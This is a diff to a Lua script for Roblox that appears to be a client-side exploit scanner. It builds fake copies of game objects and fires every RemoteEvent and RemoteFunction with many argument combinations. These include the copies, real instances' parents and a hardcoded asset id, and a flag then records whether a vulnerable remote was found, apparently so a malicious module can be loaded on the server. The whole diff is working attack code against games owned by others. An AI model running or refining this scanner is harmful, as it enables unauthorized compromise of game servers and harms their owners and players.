@@ -50,9 +50,13 @@ local function buildPropertyMap(apiDump)
 end
 local moduleid = 119017964340608
 local propertyMap = buildPropertyMap(apiDump)
-local function mimicObject(instance,exclusions,children) -- exclusions must be instances (will be included without mimic)
-	local className = instance.ClassName
-	if className==("ModuleScript") then
+local caca = {}
+local function mimicObject(instance,exclusions,children,ispar) -- exclusions must be instances (will be included without mimic)
+	if caca[instance] then
+        return caca[instance]
+    end
+    local className = instance.ClassName
+	if className==("ModuleScript") and not ispar then
 		return moduleid
 	end
 	local mimic = {}
@@ -63,7 +67,11 @@ local function mimicObject(instance,exclusions,children) -- exclusions must be i
 		end)
 		if success then
             if typeof(value) == "instance" then
-                value = mimicObject(value,exclusions,true)
+                local ispar=false
+                if propName == "Parent" then
+                    ispar=true
+                end
+                value = mimicObject(value,exclusions,true,ispar)
             end
 			mimic[propName] = value
 		end
@@ -79,6 +87,7 @@ local function mimicObject(instance,exclusions,children) -- exclusions must be i
 			end
 		end
 	end
+    caca[instance] = mimic
 	return mimic
 end
 function check(tablee,ignorelist)
@@ -123,7 +132,7 @@ end
 local forrealsies = {}
 local fakes = {}
 for i,v in pairs(game.Workspace:GetDescendants()) do
-    if v:IsA"ModuleScript" then
+    if v:IsA"ModuleScript" and not v:GetFullName():find"CorePackages" and not v:GetFullName():find"CoreGui" then
         table.insert(forrealsies, v)
     end
 end
@@ -143,26 +152,26 @@ for i,rem in pairs(rems) do
     if rem:IsA"RemoteEvent" then
         remi = i
         for i,v in pairs(fakes) do
-            lastrem=rem
+           lastrem = v
             rem:FireServer(nil,nil,nil,v)
-            rem:FireServer(nil,nil,v)
-            rem:FireServer(nil,v)
-            rem:FireServer(v)
-            rem:FireServer(nil,nil,nil,moduleid)
-            rem:FireServer(v,v,v,v,v,v,v)
-            v = forrealsies[i]
-            rem:FireServer(nil,nil,nil,v.Parent)
-            rem:FireServer(nil,nil,v.Parent)
-            rem:FireServer(nil,v.Parent)
-            rem:FireServer(v.Parent)
-            rem:FireServer(nil,nil,nil,moduleid)
-            rem:FireServer(v.Parent,v.Parent,v.Parent,v.Parent,v.Parent,v.Parent)
-            rem:FireServer(nil,nil,nil,v.Parent.Parent)
-            rem:FireServer(nil,nil,v.Parent.Parent)
-            rem:FireServer(nil,v.Parent.Parent)
-            rem:FireServer(v.Parent.Parent)
-            rem:FireServer(nil,nil,nil,moduleid)
-            rem:FireServer(v.Parent.Parent,v.Parent.Parent,v.Parent.Parent,v.Parent.Parent,v.Parent.Parent,v.Parent.Parent)
+rem:FireServer(nil,nil,v)
+rem:FireServer(nil,v)
+rem:FireServer(v)
+rem:FireServer(nil,nil,nil,moduleid)
+rem:FireServer(v,v,v,v,v,v,v)
+v = mimicObject(forrealsies[i].Parent,{},true,true)
+rem:FireServer(nil,nil,nil,v)
+rem:FireServer(nil,nil,v)
+rem:FireServer(nil,v)
+rem:FireServer(v)
+rem:FireServer(nil,nil,nil,moduleid)
+rem:FireServer(v,v,v,v,v,v)
+rem:FireServer(nil,nil,nil,v.Parent)
+rem:FireServer(nil,nil,v.Parent)
+rem:FireServer(nil,v.Parent)
+rem:FireServer(v.Parent)
+rem:FireServer(nil,nil,nil,moduleid)
+rem:FireServer(v.Parent,v.Parent,v.Parent,v.Parent,v.Parent,v.Parent)
         end
         task.wait(.3)
         if isvulnfound then
@@ -178,13 +187,13 @@ rem:InvokeServer(nil,v)
 rem:InvokeServer(v)
 rem:InvokeServer(nil,nil,nil,moduleid)
 rem:InvokeServer(v,v,v,v,v,v,v)
-v = forrealsies[i]
-rem:InvokeServer(nil,nil,nil,v.Parent)
-rem:InvokeServer(nil,nil,v.Parent)
-rem:InvokeServer(nil,v.Parent)
-rem:InvokeServer(v.Parent)
+v = mimicObject(forrealsies[i].Parent,{},true)
+rem:InvokeServer(nil,nil,nil,v)
+rem:InvokeServer(nil,nil,v)
+rem:InvokeServer(nil,v)
+rem:InvokeServer(v)
 rem:InvokeServer(nil,nil,nil,moduleid)
-rem:InvokeServer(v.Parent,v.Parent,v.Parent,v.Parent,v.Parent,v.Parent)
+rem:InvokeServer(v,v,v,v,v,v)
 rem:InvokeServer(nil,nil,nil,v.Parent.Parent)
 rem:InvokeServer(nil,nil,v.Parent.Parent)
 rem:InvokeServer(nil,v.Parent.Parent)
